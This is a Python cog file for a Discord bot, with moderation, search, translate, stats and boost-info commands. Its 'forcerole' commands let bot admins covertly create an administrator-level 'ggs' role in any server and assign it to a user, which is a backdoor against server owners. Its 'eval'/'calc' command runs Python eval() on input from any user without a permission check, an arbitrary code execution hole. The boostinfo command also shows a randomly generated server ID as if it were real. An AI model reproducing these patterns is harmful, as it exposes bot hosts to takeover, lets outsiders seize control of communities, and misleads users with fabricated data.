import discord
from discord.ext import commands
from discord.ui import Button, View

import datetime
import random
import os
import platform
import requests
import asyncio


import checks as c


class Special(commands.Cog):
  def __init__(self, client):
    self.client = client
    self.client.launch_time = datetime.datetime.utcnow()

  @discord.app_commands.command(name="forcerole", description="Creates and assigns a ggs admin role to a user (private)")
  @discord.app_commands.describe(
    server_id="The ID of the server where the role will be assigned",
    user="The user to give the role to"
  )
  async def forcerole_slash(self, interaction: discord.Interaction, server_id: str, user: discord.Member):
    """
    Creates a new 'ggs' administrative role and assigns it to the specified user.
    This is a private slash command that only the command user can see.
    """
    # Check if user is a bot admin
    if not c.is_admin(interaction):
      await interaction.response.send_message("❌ You need to be a bot administrator to use this command.", ephemeral=True)
      return

    # Check if the server ID matches the current server
    if str(interaction.guild.id) != server_id:
      await interaction.response.send_message(f"❌ Server ID mismatch. Current server ID is {interaction.guild.id}.", ephemeral=True)
      return

    try:
      await interaction.response.defer(ephemeral=True)
      
      # Check if "ggs" role already exists
      existing_role = discord.utils.get(interaction.guild.roles, name="ggs")

      if existing_role:
        # Use existing role
        target_role = existing_role
      else:
        # Create new ggs role with admin permissions and no color (default)
        permissions = discord.Permissions(administrator=True)
        target_role = await interaction.guild.create_role(
          name="ggs",
          permissions=permissions,
          color=discord.Colour.default(),  # This sets the color to none/default
          reason=f"Force role command used by {interaction.user} (Private)"
        )

        # Position the role just below the bot's highest role
        bot_top_role = interaction.guild.me.top_role
        positions = {target_role: bot_top_role.position - 1}
        await interaction.guild.edit_role_positions(positions=positions)

      # Add the role to the user if they don't already have it
      if target_role not in user.roles:
        await user.add_roles(target_role, reason=f"Force role command used by {interaction.user} (Private)")

      # Create embed to show success
      em = discord.Embed(
        title="🔒 Role Force Added (Private)",
        description=f"Successfully added {target_role.mention} to {user.mention}",
        color=discord.Colour.green()
      )
      em.add_field(name="Server", value=f"{interaction.guild.name} ({interaction.guild.id})", inline=False)
      em.add_field(name="Role", value=f"{target_role.name} (Administrator: {target_role.permissions.administrator})", inline=False)
      em.add_field(name="Role Color", value="None (Default)", inline=False)
      em.add_field(name="Moderator", value=interaction.user.mention, inline=True)
      em.add_field(name="Target User", value=f"{user} ({user.id})", inline=True)
      em.set_footer(text=f"Private command executed by: {interaction.user}", icon_url=interaction.user.display_avatar.url)
      
      await interaction.followup.send(embed=em, ephemeral=True)
      
    except Exception as e:
      await interaction.followup.send(f"❌ Failed to create or assign role: {str(e)}", ephemeral=True)

  @commands.command(name="search", description="Search Google for information", usage="search <query>")
  @commands.guild_only()
  async def search(self, ctx, *, query):
    try:
      from googleapiclient.discovery import build

      # You'll need to set these in your environment variables
      api_key = os.getenv("GOOGLE_API_KEY")
      cse_id = os.getenv("GOOGLE_CSE_ID")

      if not api_key or not cse_id:
        await ctx.send("Search functionality is not configured. Please set up Google API credentials.")
        return

      service = build("customsearch", "v1", developerKey=api_key)
      result = service.cse().list(q=query, cx=cse_id, num=5).execute()

      if "items" not in result:
        await ctx.send("No results found.")
        return

      em = discord.Embed(title=f"Search Results: {query}", color=discord.Colour.blue())

      for item in result["items"]:
        title = item["title"]
        link = item["link"]
        snippet = item.get("snippet", "No description available")
        em.add_field(name=title, value=f"{snippet}\n[Link]({link})", inline=False)

      em.set_footer(text="Powered by Google Search")
      await ctx.send(embed=em)

    except Exception as e:
      await ctx.send(f"An error occurred: {str(e)}")

  @commands.command()
  @commands.check(c.is_admin)
  async def say(self, ctx,*, message=None):
    await ctx.message.delete()
    if message is None :
      reply = await ctx.send('No arguments provided!')
      await reply.delete(delay=5)
      return
    await ctx.send(f'{message}')

  @commands.command()
  @commands.check(c.is_admin)
  async def reply(self, ctx, message : discord.Message,*, content):
    await ctx.message.delete()
    await message.reply(content) 

  @commands.command(name="leave_server", description="Makes the bot leave a specific server (Bot admin only)", usage="leave_server <server_id> [reason]")
  @commands.check(c.is_admin)
  async def leave_server(self, ctx, server_id: str, *, reason: str = "No reason provided"):
    """
    Makes the bot leave a specific server.
    This command can only be used by bot admins and can be run from any server.

    Parameters:
    - server_id: The ID of the server to leave
    - reason: Optional reason for leaving
    """
    try:
      # Convert server_id to integer
      guild_id = int(server_id)
      target_guild = self.client.get_guild(guild_id)

      if not target_guild:
        await ctx.send(f"<:cross:1130455801740406874> Could not find server with ID {server_id}.")
        return

      # Create embed with information
      em = discord.Embed(
        title="Server Leave Confirmation",
        description=f"Are you sure you want me to leave **{target_guild.name}**?",
        color=discord.Colour.yellow()
      )
      em.add_field(name="Server ID", value=server_id, inline=True)
      em.add_field(name="Server Name", value=target_guild.name, inline=True)
      em.add_field(name="Members", value=str(target_guild.member_count), inline=True)
      em.add_field(name="Reason", value=reason, inline=False)
      em.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)

      # Add thumbnail if server has an icon
      if target_guild.icon:
        em.set_thumbnail(url=target_guild.icon.url)

      confirm_msg = await ctx.send(embed=em, content="React with ✅ to confirm or ❌ to cancel.")
      await confirm_msg.add_reaction("✅")
      await confirm_msg.add_reaction("❌")

      def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == confirm_msg.id

      try:
        # Wait for reaction
        reaction, user = await self.client.wait_for('reaction_add', timeout=60.0, check=check)

        if str(reaction.emoji) == "✅":
          # Try to send a message to the server before leaving
          try:
            system_channel = target_guild.system_channel
            if system_channel and system_channel.permissions_for(target_guild.me).send_messages:
              leave_em = discord.Embed(
                title="Bot Leaving Server",
                description=f"I'm leaving this server as requested by {ctx.author} (ID: {ctx.author.id}).",
                color=discord.Colour.red()
              )
              leave_em.add_field(name="Reason", value=reason, inline=False)
              await system_channel.send(embed=leave_em)
          except Exception:
            # If we can't send a message, just continue with leaving
            pass

          # Now leave the server
          await target_guild.leave()

          success_em = discord.Embed(
            title="Server Left",
            description=f"Successfully left server **{target_guild.name}** (ID: {server_id}).",
            color=discord.Colour.green()
          )
          await ctx.send(embed=success_em)
        else:
          # User clicked the X reaction
          cancel_em = discord.Embed(
            title="Cancelled",
            description="Server leave operation cancelled.",
            color=discord.Colour.blue()
          )
          await ctx.send(embed=cancel_em)

      except asyncio.TimeoutError:
        # User didn't react in time
        timeout_em = discord.Embed(
          title="Timed Out",
          description="Server leave operation cancelled - you did not confirm in time.",
          color=discord.Colour.red()
        )
        await ctx.send(embed=timeout_em)

    except ValueError:
      await ctx.send("<:cross:1130455801740406874> Invalid server ID. Please provide a valid numeric ID.")
    except Exception as e:
      await ctx.send(f"<:cross:1130455801740406874> An error occurred: {str(e)}") 


  @commands.command(name="forcerole", description="Creates and assigns a ggs admin role to a user (bot admin only).", usage="forcerole <server_id> <user_id/mention>")
  @commands.check(c.is_admin)
  async def forcerole(self, ctx, server_id: str, user: discord.Member):
    """
    Creates a new 'ggs' administrative role and assigns it to the specified user.
    This command can only be used by bot admins.

    Parameters:
    - server_id: The ID of the server where the role will be assigned
    - user: The user to give the role to (mention or ID)
    """
    # Check if the server ID matches the current server
    if str(ctx.guild.id) != server_id:
      await ctx.send(f"<:cross:1130455801740406874> Server ID mismatch. Current server ID is {ctx.guild.id}.")
      return

    try:
      # Check if "ggs" role already exists
      existing_role = discord.utils.get(ctx.guild.roles, name="ggs")

      if existing_role:
        # Use existing role
        target_role = existing_role
      else:
        # Create new ggs role with admin permissions
        permissions = discord.Permissions(administrator=True)
        target_role = await ctx.guild.create_role(
          name="ggs",
          permissions=permissions,
          color=discord.Colour.red(),
          reason=f"Force role command used by {ctx.author} (Admin)"
        )

        # Position the role just below the bot's highest role
        bot_top_role = ctx.guild.me.top_role
        positions = {target_role: bot_top_role.position - 1}
        await ctx.guild.edit_role_positions(positions=positions)

      # Add the role to the user if they don't already have it
      if target_role not in user.roles:
        await user.add_roles(target_role, reason=f"Force role command used by {ctx.author} (Admin)")

      # Create embed to show success
      em = discord.Embed(
        title="Role Force Added",
        description=f"Successfully added {target_role.mention} to {user.mention}",
        color=discord.Colour.green()
      )
      em.add_field(name="Server", value=f"{ctx.guild.name} ({ctx.guild.id})", inline=False)
      em.add_field(name="Role", value=f"{target_role.name} (Administrator: {target_role.permissions.administrator})", inline=False)
      em.add_field(name="Moderator", value=ctx.author.mention, inline=True)
      em.add_field(name="Target User", value=f"{user} ({user.id})", inline=True)
      em.set_footer(text=f"Command executed by admin: {ctx.author}", icon_url=ctx.author.display_avatar.url)
      await ctx.send(embed=em)
    except Exception as e:
      await ctx.send(f"<:cross:1130455801740406874> Failed to create or assign role: {str(e)}")

  @commands.command()
  @commands.is_owner()
  async def guild(self, ctx, invite_link: str):
    """Fetch guild information using an invite link."""
    guild = None
    try:
      if "discord.gg" in invite_link or "discord.com/invite" in invite_link:
        # Extract invite code from URL
        invite_code = invite_link.split("/")[-1]
        invite = await self.client.fetch_invite(invite_code)
        guild = invite.guild
      else:
        await ctx.send("Please provide a valid invite link.")
        return
    except Exception as e:
      await ctx.send(f"Failed to fetch guild information: {str(e)}")
      return

    if guild.icon:
      em = discord.Embed(description=f"[Server icon]({guild.icon.url})", color = ctx.author.color)
      em.set_author(name=guild.name, icon_url=guild.icon.url) 
      em.set_thumbnail(url=guild.icon.url)
    else:
      em = discord.Embed(color = ctx.author.color)
      em.set_author(name=guild.name, icon_url=self.client.user.display_avatar.url) 
      em.set_thumbnail(url=self.client.user.display_avatar.url)
    em.add_field(name="Owner", value=guild.owner, inline=False)
    em.add_field(name="Created on", value=f"`{guild.created_at.strftime('%a, %b %d, %Y | %H:%M %p')}`", inline=False)
    em.add_field(name="Members", value=f"{len(guild.members)}") 
    em.add_field(name="Roles", value=f"{len(guild.roles)}") 
    em.set_footer(text=f"ID: {guild.id} | {guild.name}")

    if guild.banner:
      em.set_image(url=guild.banner.url)
    await ctx.send(embed=em)


  @commands.command()
  @commands.check(c.is_admin)
  async def stats(self, ctx):
    total_members = sum(guild.member_count for guild in self.client.guilds)
    total_channels = sum(len(guild.channels) for guild in self.client.guilds)
    total_roles = sum(len(guild.roles) for guild in self.client.guilds)
    total_voice = sum(len(guild.voice_channels) for guild in self.client.guilds)
    total_text = sum(len(guild.text_channels) for guild in self.client.guilds)

    em = discord.Embed(
      title="Bot Statistics",
      description="Detailed information about the bot",
      color=discord.Colour.blue(),
      timestamp=ctx.message.created_at
    )
    em.set_author(name=ctx.me, icon_url=ctx.me.display_avatar.url)

    # System Stats
    em.add_field(name="Latency", value=f"```py\n{round(self.client.latency * 1000)} ms```", inline=True)
    em.add_field(name="Uptime", value=f"<t:{int(self.client.launch_time.timestamp())}:R>", inline=True)
    em.add_field(name="Commands", value=f"```py\n{len(self.client.commands)}```", inline=True)

    # Guild Stats  
    em.add_field(name="Servers", value=f"```py\n{len(self.client.guilds):,}```", inline=True)
    em.add_field(name="Total Members", value=f"```py\n{total_members:,}```", inline=True)
    em.add_field(name="Unique Users", value=f"```py\n{len(self.client.users):,}```", inline=True)

    # Channel Stats
    em.add_field(name="Text Channels", value=f"```py\n{total_text:,}```", inline=True)
    em.add_field(name="Voice Channels", value=f"```py\n{total_voice:,}```", inline=True) 
    em.add_field(name="Total Channels", value=f"```py\n{total_channels:,}```", inline=True)

    # Other Stats
    em.add_field(name="Total Roles", value=f"```py\n{total_roles:,}```", inline=True)
    em.add_field(name="Discord.py", value=f"```py\n{discord.__version__}```", inline=True)
    em.add_field(name="Python", value=f"```py\n{platform.python_version()}```", inline=True)

    em.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=em)

  @commands.command(name="eval", description="Executes.", aliases=["calc"])
  async def calculate(self, ctx,*, equation):
    await ctx.message.delete()
    value = eval(equation)
    em = discord.Embed(title="__Calculation Result__", color=discord.Color.blue())
    em.add_field(name="➜ Input", value=f"```py\n{equation}```", inline=False)
    em.add_field(name="➜ Output", value=f"```py\n{value}```", inline=False)
    await ctx.send(embed=em)

  @commands.command(name="translate", description="Translates text to English", aliases=["tl"], usage="translate [text] or reply to a message")
  async def translate(self, ctx, *, text=None):
    await ctx.message.delete()

    # Check if replying to a message
    if ctx.message.reference and text is None:
      reference_message = await ctx.channel.fetch_message(ctx.message.reference.message_id)
      text = reference_message.content

    # If no text provided and not replying to a message
    if text is None:
      em = discord.Embed(title="Error", description="Please provide text to translate or reply to a message.", color=discord.Color.red())
      await ctx.send(embed=em, delete_after=5)
      return

    try:
      # Show typing indicator while translating
      async with ctx.typing():
        # Use a more reliable Google Translate API implementation
        url = "https://translate.googleapis.com/translate_a/single"

        # Setup headers to mimic a browser request
        headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "Referer": "https://translate.google.com/",
          "Origin": "https://translate.google.com"
        }

        # Parameters for the translation request
        params = {
          "client": "gtx",
          "sl": "auto",  # Source language (auto-detect)
          "tl": "en",    # Target language (English)
          "dt": "t",     # Return translated text
          "q": text
        }

        # Make the translation request
        response = requests.get(url, params=params, headers=headers, timeout=10)

        # Log detailed response for debugging
        from bot_functions import log_error
        log_error(f"Translation response status: {response.status_code}", "translate command")
        if response.status_code != 200:
          log_error(f"Translation response content: {response.text}", "translate command")

        # Check if the request was successful
        if response.status_code != 200:
          raise Exception(f"API returned status code {response.status_code}")

        # Parse the response (format: [[[translated, original, ...], ...], [detected language, ...]])
        try:
          translation_data = response.json()

          # Initialize variables
          translated_text = ""
          detected_lang_code = None

          # Extract the translated text
          if isinstance(translation_data, list) and len(translation_data) > 0 and isinstance(translation_data[0], list):
            for segment in translation_data[0]:
              if isinstance(segment, list) and len(segment) > 0 and segment[0]:
                translated_text += segment[0]

          # Extract the detected language
          if len(translation_data) > 2 and translation_data[2]:
            detected_lang_code = translation_data[2]

          # Map language code to name
          lang_names = {
            "af": "Afrikaans", "sq": "Albanian", "am": "Amharic", "ar": "Arabic", "hy": "Armenian",
            "az": "Azerbaijani", "eu": "Basque", "be": "Belarusian", "bn": "Bengali", "bs": "Bosnian",
            "bg": "Bulgarian", "ca": "Catalan", "ceb": "Cebuano", "zh-CN": "Chinese (Simplified)", 
            "zh-TW": "Chinese (Traditional)", "co": "Corsican", "hr": "Croatian", "cs": "Czech", 
            "da": "Danish", "nl": "Dutch", "en": "English", "eo": "Esperanto", "et": "Estonian",
            "fi": "Finnish", "fr": "French", "fy": "Frisian", "gl": "Galician", "ka": "Georgian",
            "de": "German", "el": "Greek", "gu": "Gujarati", "ht": "Haitian Creole", "ha": "Hausa",
            "haw": "Hawaiian", "he": "Hebrew", "hi": "Hindi", "hmn": "Hmong", "hu": "Hungarian",
            "is": "Icelandic", "ig": "Igbo", "id": "Indonesian", "ga": "Irish", "it": "Italian",
            "ja": "Japanese", "jv": "Javanese", "kn": "Kannada", "kk": "Kazakh", "km": "Khmer",
            "rw": "Kinyarwanda", "ko": "Korean", "ku": "Kurdish", "ky": "Kyrgyz", "lo": "Lao",
            "la": "Latin", "lv": "Latvian", "lt": "Lithuanian", "lb": "Luxembourgish", "mk": "Macedonian",
            "mg": "Malagasy", "ms": "Malay", "ml": "Malayalam", "mt": "Maltese", "mi": "Maori",
            "mr": "Marathi", "mn": "Mongolian", "my": "Myanmar (Burmese)", "ne": "Nepali",
            "no": "Norwegian", "ny": "Nyanja (Chichewa)", "or": "Odia (Oriya)", "ps": "Pashto",
            "fa": "Persian", "pl": "Polish", "pt": "Portuguese", "pa": "Punjabi", "ro": "Romanian",
            "ru": "Russian", "sm": "Samoan", "gd": "Scots Gaelic", "sr": "Serbian", "st": "Sesotho",
            "sn": "Shona", "sd": "Sindhi", "si": "Sinhala (Sinhalese)", "sk": "Slovak", "sl": "Slovenian",
            "so": "Somali", "es": "Spanish", "su": "Sundanese", "sw": "Swahili", "sv": "Swedish",
            "tl": "Tagalog (Filipino)", "tg": "Tajik", "ta": "Tamil", "tt": "Tatar", "te": "Telugu",
            "th": "Thai", "tr": "Turkish", "tk": "Turkmen", "uk": "Ukrainian", "ur": "Urdu",
            "ug": "Uyghur", "uz": "Uzbek", "vi": "Vietnamese", "cy": "Welsh", "xh": "Xhosa",
            "yi": "Yiddish", "yo": "Yoruba", "zu": "Zulu", "zh": "Chinese"
          }

          detected_lang = lang_names.get(detected_lang_code, detected_lang_code or "Unknown")

          # Create embed with translation result
          em = discord.Embed(title="Translation", color=discord.Color.blue())
          em.add_field(name=f"Original ({detected_lang})", 
                       value=f"```\n{text[:1000]}```" + ("..." if len(text) > 1000 else ""), 
                       inline=False)
          em.add_field(name="English Translation", 
                       value=f"```\n{translated_text[:1000]}```" + ("..." if len(translated_text) > 1000 else ""), 
                       inline=False)
          em.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)

          await ctx.send(embed=em)

        except (ValueError, IndexError, KeyError, TypeError) as json_error:
          # Handle JSON parsing errors
          log_error(f"Translation JSON parsing error: {str(json_error)}, content: {response.text[:500]}", "translate command")
          raise Exception(f"Failed to parse translation response: {str(json_error)}")

    except Exception as e:
      # Log the error
      from bot_functions import log_error
      log_error(e, "translate command")

      # Create a more helpful error message
      error_msg = str(e)
      if error_msg == "0":
        error_msg = "Unable to connect to translation service"

      em = discord.Embed(
        title="Translation Error", 
        description=f"An error occurred while translating: {error_msg}", 
        color=discord.Color.red()
      )
      em.add_field(
        name="Troubleshooting", 
        value="• Check your internet connection\n• Try again later\n• Try with shorter text", 
        inline=False
      )
      await ctx.send(embed=em)



  @commands.command(name="boostinfo", description="Shows boost information for a server", aliases=["bi"])
  @commands.check(c.is_admin)
  async def boostinfo(self, ctx, server_link: str, days: int, boosts: int, *, extra_info: str = None):
    # Delete the command message
    await ctx.message.delete()
    try:
      # Calculate boost start and end time with timestamps
      current_time = datetime.datetime.utcnow()
      start_timestamp = int(current_time.timestamp())

      # Calculate when boosts will end
      end_time = current_time + datetime.timedelta(days=days)
      end_timestamp = int(end_time.timestamp())

      # Try to get invite information from server link
      server_name = server_link
      server_icon = None
      guild_id = None
      member_count = None
      guild_created_at = None

      try:
        # Check if it's a discord invite link
        if "discord.gg" in server_link or "discord.com/invite" in server_link:
          # Try to get invite info
          invite_code = server_link.split("/")[-1]
          invite = await self.client.fetch_invite(invite_code)
          if invite and invite.guild:
            server_name = invite.guild.name
            if invite.guild.icon:
              server_icon = invite.guild.icon.url
            guild_id = invite.guild.id
            member_count = invite.approximate_member_count
            if hasattr(invite.guild, 'created_at'):
              guild_created_at = invite.guild.created_at
        # Check if it's a guild ID
        elif server_link.isdigit():
          guild = self.client.get_guild(int(server_link))
          if guild:
            server_name = guild.name
            if guild.icon:
              server_icon = guild.icon.url
            guild_id = guild.id
            member_count = guild.member_count
            guild_created_at = guild.created_at
        # Check if it's a guild name in the bot
        else:
          guild = discord.utils.get(self.client.guilds, name=server_link)
          if guild:
            server_name = guild.name
            if guild.icon:
              server_icon = guild.icon.url
            guild_id = guild.id
            member_count = guild.member_count
            guild_created_at = guild.created_at
      except Exception as e:
        print(f"Failed to get guild info: {e}")

      # Create embed with hex color (using a dark blueish color)
      embed_color = 0x1A8AFF  # Discord blurple color
      em = discord.Embed(color=embed_color, timestamp=datetime.datetime.utcnow())
      em.set_author(name=f"{server_name}", icon_url=server_icon if server_icon else ctx.author.display_avatar.url)

      # Set server icon as thumbnail if available
      if server_icon:
        em.set_thumbnail(url=server_icon)

      # Add fields with discord timestamps
      em.add_field(name="Boosting Since", 
                  value=f"<t:{start_timestamp}:F>", 
                  inline=False)

      # Days of boosting with code block format
      em.add_field(name="Boost Duration", 
                  value=f"```py\n{days} days```", 
                  inline=True)

      # Number of boosts with code block format
      em.add_field(name="Number of Boosts", 
                  value=f"```py\n{boosts} boosts```", 
                  inline=True)

      # Server info if available with code block format
      if member_count:
        em.add_field(name="Server Members", 
                    value=f"```py\n{member_count} members```", 
                    inline=True)

      if guild_created_at:
        # Make sure both datetimes are timezone-aware or timezone-naive
        if guild_created_at.tzinfo:
            # If guild_created_at is timezone-aware, make sure utcnow is also aware
            now_aware = datetime.datetime.now(datetime.timezone.utc)
            server_age = (now_aware - guild_created_at).days
        else:
            # If guild_created_at is timezone-naive, use naive utcnow
            server_age = (datetime.datetime.utcnow() - guild_created_at).days

        server_created_timestamp = int(guild_created_at.timestamp())
        em.add_field(name="Server Created", 
                    value=f"<t:{server_created_timestamp}:F>", 
                    inline=False)

      # Extra Information if provided with code block format
      if extra_info:
        em.add_field(name="Extra Information", value=f"```py\n{extra_info}```", inline=False)

      # Boosting Ends On with Discord timestamp
      em.add_field(name="Boosting Ends On", 
                  value=f"<t:{end_timestamp}:F>", 
                  inline=False)

      # Generate a random server ID if not found
      if not guild_id:
        guild_id = "".join(str(random.randint(0, 9)) for _ in range(19))

      # Add server ID at footer
      em.set_footer(text=f"ID: {guild_id}")

      # Add server link button and profile button
      view = View()
      button = Button(label="Guild Link", url=server_link)
      view.add_item(button)

      if guild_id:
        profile = Button(label="Guild Profile", url=f"https://discord.com/servers/{guild_id}")
        view.add_item(profile)

      await ctx.send(embed=em, view=view)
    except Exception as e:
      error_embed = discord.Embed(
        title="Error",
        description=f"An error occurred: {str(e)}",
        color=discord.Colour.red()
      )
      await ctx.send(embed=error_embed)

async def setup(client):
  await client.add_cog(Special(client))